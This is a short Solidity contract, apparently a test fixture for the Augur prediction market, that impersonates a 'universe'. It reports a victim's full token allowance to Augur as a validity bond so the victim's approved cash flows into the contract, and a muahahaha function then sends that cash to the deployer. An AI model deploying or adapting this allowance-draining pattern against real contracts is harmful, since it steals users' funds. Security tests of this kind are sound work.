pragma solidity 0.5.15;

import 'ROOT/libraries/token/IERC20.sol';


contract MaliciousUniverse {
    address public victim;
    IERC20 public cash;
    address public augur;
    address public owner;

    constructor(address _victim, IERC20 _cash, address _augur) public {
        victim = _victim;
        cash = _cash;
        augur = _augur;
        owner = msg.sender;
    }

    function getOrCacheValidityBond() public returns (uint256) {
        return cash.allowance(victim, augur);
    }

    function isForking() public returns (bool) {
        return false;
    }

    function getOrCacheMarketRepBond() public returns (uint256) {
        return 0;
    }

    function getForkingMarket() public returns (address) {
        return msg.sender;
    }

    function getOrCreateNextDisputeWindow(bool _immediate) public returns (address) {
        return address(this);
    }

    function getReputationToken() public returns (address) {
        return address(this);
    }

    function balanceOf(address) public returns (uint256) {
        return 0;
    }

    function transfer(address, uint256) public returns (bool) {
        return true;
    }

    function muahahaha() public returns (bool) {
        cash.transfer(owner, cash.balanceOf(address(this)));
    }
}
